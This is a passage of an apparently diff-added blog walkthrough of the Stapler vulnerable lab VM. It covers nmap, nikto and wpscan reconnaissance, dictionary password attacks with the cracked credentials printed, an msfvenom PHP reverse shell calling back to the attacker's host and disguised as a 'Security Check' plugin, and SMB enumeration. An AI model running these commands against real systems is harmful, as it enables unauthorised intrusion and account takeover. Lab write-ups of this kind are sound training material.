+            <div>SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd</div>
+            <div>SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa</div>
+            <div>SF:f\xbd&amp;&amp;q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:</div>
+            <div>SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\</div>
+            <div>SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&amp;\xb9N\x9e&lt;\xb1\\\.\xb9\xcc\</div>
+            <div>SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd</div>
+            <div>SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\</div>
+            <div>SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\</div>
+            <div>SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\</div>
+            <div>SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak</div>
+            <div>SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\</div>
+            <div>SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f</div>
+            <div>SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\</div>
+            <div>SF:[\x93&amp;\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&amp;M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x</div>
+            <div>SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa</div>
+            <div>SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\</div>
+            <div>SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9</div>
+            <div>SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb&lt;C\xcap\x8f</div>
+            <div>SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&amp;\xf4</div>
+            <div>SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\</div>
+            <div>SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb</div>
+            <div>SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0</div>
+            <div>SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\</div>
+            <div>SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x</div>
+            <div>SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\</div>
+            <div>SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");</div>
+            <div>MAC Address: 08:00:27:67:B9:50 (Oracle VirtualBox virtual NIC)</div>
+            <div>Device type: general purpose</div>
+            <div>Running: Linux 3.X|4.X</div>
+            <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
+            <div>OS details: Linux 3.2 - 4.9</div>
+            <div>Network Distance: 1 hop</div>
+            <div>Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+            <div>
+                <div><br /></div>
+            </div>
+            <div>Host script results:</div>
+            <div>|_clock-skew: mean: -5h20m02s, deviation: 34m38s, median: -5h00m02s</div>
+            <div>|_nbstat: NetBIOS name: RED, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</div>
+            <div>| smb-os-discovery:</div>
+            <div>|   OS: Windows 6.1 (<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Samba 4.3.9-Ubuntu</font>)</div>
+            <div>|   Computer name: red</div>
+            <div>|   NetBIOS computer name: RED\x00</div>
+            <div>|   Domain name: \x00</div>
+            <div>|   FQDN: red</div>
+            <div>|_  System time: 2019-04-19T00:03:44+01:00</div>
+            <div>| smb-security-mode:</div>
+            <div>|   account_used: guest</div>
+            <div>|   authentication_level: user</div>
+            <div>|   challenge_response: supported </div>
+            <div>|_  message_signing: disabled (dangerous, but default)</div>
+            <div>| smb2-security-mode:</div>
+            <div>|   2.02:</div>
+            <div>|_    Message signing enabled but not required</div>
+            <div>| smb2-time:</div>
+            <div>|   date: 2019-04-18 19:03:44</div>
+            <div>|_  start_date: N/A</div>
+            <div>
+                <div><br /></div>
+            </div>
+            <div>TRACEROUTE</div>
+            <div>HOP RTT     ADDRESS</div>
+            <div>1   2.87 ms red.initech.homenet.dom (10.183.0.194)</div>
+        </div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 164.07 seconds</div>
+    </div>
+</div>
+<div><br /></div>
+<!--more-->
+<div><br /></div>
+<div>
+    <h2>Gaining Access</h2>
+</div>
+<div><br /></div>
+<div>We detected lots of open ports and services and we were able to determine some software versions, including:</div>
+<ul>
+    <li>
+        <div>vsFTPd 3.0.3 - no known exploits</div>
+    </li>
+    <li>
+        <div>dnsmasq-2.75 - lots of DoS vulnerabilities</div>
+    </li>
+    <li>
+        <div>MySQL 5.7.12-0ubuntu1 - a possible Integer Overflow we could use, but is listed as DoS</div>
+    </li>
+    <li>
+        <div>Apache/2.4.18 - a Local Privilege Escalation vulnerability we might can use</div>
+    </li>
+    <li>
+        <div>Samba 4.3.9-Ubuntu - no known exploits</div>
+    </li>
+</ul>
+<div><br /></div>
+<div>Let's take a look at the HTTP services on TCP port 80 and TCP port 12380.</div>
+<div><br /></div>
+<div>The default page for the HTTP service on TCP port 80 returns a "404 Not Found" error. Scanning it with nikto produces the following:</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# nikto -h http://10.183.0.194/</div>
+    <div>- Nikto v2.1.6</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Target IP:          10.183.0.194</div>
+    <div>+ Target Hostname:    10.183.0.194</div>
+    <div>+ Target Port:        80</div>
+    <div>+ Start Time:         2019-04-19 00:40:21 (GMT-4)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Server: No banner retrieved</div>
+    <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
+    <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
+    <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div>
+    <div>+ No CGI Directories found (use '-C all' to force check all possible dirs)</div>
+    <div>+ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.</div>
+    <div>+ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.</div>
+    <div>+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response</div>
+    <div>+ Scan terminated:  20 error(s) and 5 item(s) reported on remote host</div>
+    <div>+ End Time:           2019-04-19 00:41:06 (GMT-4) (45 seconds)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ 1 host(s) tested</div>
+</div>
+<div><br /></div>
+<div>Based on the existence of the .bashrc and .profile files, the document root for this service is likely a user's home directory.</div>
+<div><br /></div>
+<div>The default page for the HTTP service on TCP port 12380 returns an interesting page that implies the service setup was incomplete. That's good for us. There are also some comments spread throughout the page with potential employees/usernames.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>&lt;!-- Credit: http://www.creative-tim.com/product/coming-sssoon-page --&gt;</div>
+    <div>&lt;!-- A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! --&gt;</div>
+    <div>&lt;!--    Change the image source '/images/default.jpg' with your favourite image.     --&gt;</div>
+    <div>&lt;!--   You can change the black color for the filter with those colors: blue, green, red, orange       --&gt;</div>
+    <div>&lt;!--  H1 can have 2 designs: "logo" and "logo cursive"           --&gt;</div>
+</div>
+<div><br /></div>
+<div>Scanning it with nikto produces the following:</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# nikto -h http://10.183.0.194:12380</div>
+    <div>- Nikto v2.1.6</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Target IP:          10.183.0.194</div>
+    <div>+ Target Hostname:    10.183.0.194</div>
+    <div>+ Target Port:        12380</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost</div>
+    <div>                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384</div>
+    <div>                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost</div>
+    <div>+ Start Time:         2019-04-19 00:44:25 (GMT-4)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> (Ubuntu)</div>
+    <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
+    <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
+    <div>+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here</div>
+    <div>+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.</div>
+    <div>+ The site uses SSL and Expect-CT header is not present.</div>
+    <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div>
+    <div>+ No CGI Directories found (use '-C all' to force check all possible dirs)</div>
+    <div>+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ "robots.txt" contains 2 entries which should be manually viewed.</div>
+    <div>+ Hostname '10.183.0.194' does not match certificate's names: Red.Initech</div>
+    <div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div>
+    <div>+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD </div>
+    <div>+ Uncommon header 'x-ob_mode' found, with contents: 1</div>
+    <div>+ OSVDB-3233: /icons/README: Apache default file found.</div>
+    <div>+ <font style="color: rgb(255, 38, 0); --inversion-type-color: simple;">/phpmyadmin/: phpMyAdmin directory found</font>
+    </div>
+    <div>+ 8071 requests: 0 error(s) and 15 item(s) reported on remote host</div>
+    <div>+ End Time:           2019-04-19 00:48:35 (GMT-4) (250 seconds)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ 1 host(s) tested</div>
+</div>
+<div><br /></div>
+<div>Checking the directories in robots.txt, the /admin112233 gives us a cheeky warning and redirects us. The /blogblog directory, however, returns a WordPress site for INITECH. We also see a potential username ('pam') in the certificate information. Nikto also alerted us to a phpmyadmin site, which should be interesting. Let's start by digging into the WordPress site with wpscan.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# wpscan --disable-tls-checks --url https://10.183.0.194:12380/blogblog --wp-content-dir wp-content --enumerate</div>
+    <div>_______________________________________________________________</div>
+    <div>        __          _______   _____</div>
+    <div>        \ \        / /  __ \ / ____|</div>
+    <div>         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</div>
+    <div>          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</div>
+    <div>           \  /\  /  | |     ____) | (__| (_| | | | |</div>
+    <div>            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>        WordPress Security Scanner by the WPScan Team</div>
+    <div>                       Version 3.5.1</div>
+    <div>          Sponsored by Sucuri - https://sucuri.net</div>
+    <div>      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</div>
+    <div>_______________________________________________________________</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[+] URL: https://10.183.0.194:12380/blogblog/</div>
+    <div>[+] Started: Fri Apr 19 00:55:21 2019</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Interesting Finding(s):</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[+] https://10.183.0.194:12380/blogblog/</div>
+    <div> | Interesting Entries:</div>
+    <div> |  - Server: Apache/2.4.18 (Ubuntu)</div>
+    <div> |  - Dave: Soemthing doesn't look right here</div>
+    <div> | Found By: Headers (Passive Detection)</div>
+    <div> | Confidence: 100%</div>
+    <div>
+        <div><br /></div>
+        <div>[...]</div>
+        <div><br /></div>
+        <div>[+] https://10.183.0.194:12380/blogblog/readme.html</div>
+        <div> | Found By: Direct Access (Aggressive Detection)</div>
+        <div> | Confidence: 100%</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>[+] Registration is enabled: https://10.183.0.194:12380/blogblog/wp-login.php?action=register</div>
+        <div> | Found By: Direct Access (Aggressive Detection)</div>
+        <div> | Confidence: 100%</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>[+] Upload directory has listing enabled: https://10.183.0.194:12380/blogblog/wp-content/uploads/</div>
+        <div> | Found By: Direct Access (Aggressive Detection)</div>
+        <div> | Confidence: 100%</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>[+] https://10.183.0.194:12380/blogblog/wp-cron.php</div>
+        <div> | Found By: Direct Access (Aggressive Detection)</div>
+        <div> | Confidence: 60%</div>
+        <div> | References:</div>
+        <div> |  - https://www.iplocation.net/defend-wordpress-from-ddos</div>
+        <div> |  - https://github.com/wpscanteam/wpscan/issues/1299</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).</div>
+        <div> | Detected By: Rss Generator (Passive Detection)</div>
+        <div> |  - https://10.183.0.194:12380/blogblog/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</div>
+        <div> |  - https://10.183.0.194:12380/blogblog/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</div>
+        <div> |</div>
+        <div>
+            <div><br /></div>
+            <div>[...]</div>
+        </div>
+        <div><br /></div>
+    </div>
+    <div>[+] Enumerating Users (via Passive and Aggressive Methods)</div>
+    <div> Brute Forcing Author IDs - Time: 00:00:00 &lt;========================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[i] User(s) Identified:</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[+] John Smith</div>
+    <div> | Detected By: Author Posts - Display Name (Passive Detection)</div>
+    <div> | Confirmed By: Rss Generator (Passive Detection)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[+] elly</div>
+    <div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+    <div> | Confirmed By: Login Error Messages (Aggressive Detection)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[+] peter</div>
+    <div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+    <div> | Confirmed By: Login Error Messages (Aggressive Detection)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[+] barry</div>
+    <div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+    <div> | Confirmed By: Login Error Messages (Aggressive Detection)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[+] heather</div>
+    <div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+    <div> | Confirmed By: Login Error Messages (Aggressive Detection)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[+] john</div>
+    <div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+    <div> | Confirmed By: Login Error Messages (Aggressive Detection)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[+] garry</div>
+    <div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+    <div> | Confirmed By: Login Error Messages (Aggressive Detection)</div>
+    <div>
+        <div><br /></div>
+        <div>[+] harry</div>
+        <div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+        <div> | Confirmed By: Login Error Messages (Aggressive Detection)</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>[+] scott</div>
+        <div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+        <div> | Confirmed By: Login Error Messages (Aggressive Detection)</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>[+] kathy</div>
+        <div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+        <div> | Confirmed By: Login Error Messages (Aggressive Detection)</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>[+] tim</div>
+        <div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+        <div> | Confirmed By: Login Error Messages (Aggressive Detection)</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>[+] Finished: Fri Apr 19 00:55:35 2019</div>
+        <div>[+] Requests Done: 3092</div>
+        <div>[+] Cached Requests: 10</div>
+        <div>[+] Data Sent: 719.641 KB</div>
+        <div>[+] Data Received: 822.122 KB</div>
+        <div>[+] Memory used: 188.211 MB</div>
+        <div>[+] Elapsed time: 00:00:13</div>
+    </div>
+</div>
+<div><br /></div>
+<div>I decided to use wpscan to try to crack some of the user's passwords. Based on the posts in the blog, it looks like 'john' might be the administrator, but we'll see which accounts we can get into and maybe we can elevate from there.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>wpscan --disable-tls-checks --url https://10.183.0.194:12380/blogblog --wp-content-dir wp-content --usernames wordpress-users --passwords /usr/share/seclists/Passwords/Most-Popular-Letter-Passes.txt --output wpscan-password-attack --password-attack wp-login</div>
+</div>
+<div><br /></div>
+<div>We were able to crack the password for several of the accounts, but not 'john'. Tim seemed to be in charge of setting up the site, so let's start with looking at his account. (Also, TimThumb is a known vulnerable WordPress plugin).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>[i] Valid Combinations Found:</div>
+    <div> | Username: scott, Password: cookie</div>
+    <div> | Username: kathy, Password: coolgirl</div>
+    <div> | Username: garry, Password: football</div>
+    <div> | Username: harry, Password: monkey</div>
+    <div> | Username: tim, Password: thumb</div>
+</div>
+<div><br /></div>
+<div>The only 'Tools' available for tim (and all the other accounts we cracked) is 'Press This'. This plugin has potential because it allows file uploads, but, alas, we don't have permission to upload files.</div>
+<div><br /></div>
+<div><img height="200" src="/assets/images/2019-04-15-stapler/B4F1C66B-611C-454B-A168-6B8B9EA4FB9C.png" width="564" /><br /></div>
+<div><br /></div>
+<div>Let's see if any of the accounts we cracked can upload files... Nope!</div>
+<div><br /></div>
+<div>We remember that one of the names mentioned in the default site's comments was 'Zoe', but that name didn't show up in our enumerated users. Let's try to login as 'zoe' and see if that is a valid account... and it is!</div>
+<div><br /></div>
+<div><img height="710" src="/assets/images/2019-04-15-stapler/9F7E6440-2D23-40FA-A9B6-DEB68012EC7D.png" width="668" /><br /></div>
+<div><br /></div>
+<div>We also found another valid username ('abby') in the file <a href="https://10.183.0.194:12380/announcements/message.txt">https://10.183.0.194:12380/announcements/message.txt</a>...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Abby, we need to link the folder somewhere! Hidden at the mo</div>
+</div>
+<div><br /></div>
+<div>I split out the accounts we hadn't cracked and added the new accounts we found ('zoe' and 'abby'). I decided to try a different dictionary, too.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>wpscan --disable-tls-checks --url https://10.183.0.194:12380/blogblog --wp-content-dir wp-content --usernames wordpress-users2 --passwords /usr/share/seclists/Passwords/probable-v2-top12000.txt --output wpscan-password-attack2 --password-attack wp-login</div>
+</div>
+<div><br /></div>
+<div>This time we were able to crack John's account, which was the original goal. Let's try logging in as 'john' and see how things look.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>[i] Valid Combinations Found:</div>
+    <div>| Username: heather, Password: passphrase</div>
+    <div> | Username: john, Password: incorrect</div>
+</div>
+<div><br /></div>
+<div>As we suspected, John is an admin! 😄 Now that we have admin access to the WordPress site, we should be able to create a malicious plugin and upload it.</div>
+<div><br /></div>
+<div>We'll start by creating our PHP reverse shell using msfvenom.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -f raw &gt; rev.php</div>
+    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
+    <div>[-] No arch selected, selecting arch: php from the payload</div>
+    <div>No encoder or badchars specified, outputting raw payload</div>
+    <div>Payload size: 3034 bytes</div>
+</div>
+<div><br /></div>
+<div>To make it an acceptable plugin, we have to add some meta data to the top of the file.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>&lt;?php</div>
+    <div>/**</div>
+    <div> * Plugin Name: Security Check</div>
+    <div> * Version: 1.2</div>
+    <div> * Author: r00t Security</div>
+    <div> * Author URI: http://www.r00tsec.com</div>
+    <div> * License: GPL2</div>
+    <div> */</div>
+    <div>      @error_reporting(0);</div>
+    <div>[...]</div>
+</div>
+<div><br /></div>
+<div>Now we have to zip our file and upload it.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# zip secheck.zip rev.php</div>
+    <div>  adding: rev.php (deflated 67%)</div>
+</div>
+<div><br /></div>
+<div>To upload, in WordPress...</div>
+<ol>
+    <li>
+        <div>Click Plugins in the menu on the left</div>
+    </li>
+    <li>
+        <div>Click the Add New button at the top of the page</div>
+    </li>
+    <li>
+        <div>Click the Upload Plugin button at the top of the page</div>
+    </li>
+    <li>
+        <div>Click the Choose File button and select the ZIP</div>
+    </li>
+    <li>
+        <div>Click Install Now</div>
+    </li>
+</ol>
+<div><br /></div>
+<div>Oops! Looks like we have to have FTP credentials to upload our plugin. This is typically caused because the user running the web service (www-data, apache, etc) doesn't have permission to write to the plugins directory.</div>
+<div><br /></div>
+<div><img height="844" src="/assets/images/2019-04-15-stapler/37C491AD-8CA3-45E9-8D1F-7D734664663C.png" width="2260" /><br /></div>
+<div><br /></div>
+<div>I tried brute forcing FTP credentials with the usernames we have from WordPress (using hydra), but get nothing.</div>
+<div><br /></div>
+<div>I tried to edit a Theme to insert my own shell code. That didn't work. The themes are not editable.</div>
+<div><br /></div>
+<div>I tried to use the Metasploit module to exploit the Authenticated Code Execution issue with WordPress, but it failed doing its base64 decode test.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>use exploit/multi/http/wp_crop_rce</div>
+</div>
+<div><br /></div>
+<div>This WordPress site is starting to feel like a dead end. Let's see what other services we can poke at.</div>
+<div><br /></div>
+<div>The server has SMB available. Let's run enum4linux to see what we can find out.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>enum4linux 10.183.0.194</div>
+</div>
+<div><br /></div>
+<div>Looks like we found some shares we can look at.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div> ========================================= </div>
+    <div>|    Share Enumeration on 10.183.0.194    |</div>
+    <div> ========================================= </div>
+    <div>
+        <div><br /></div>
+    </div>
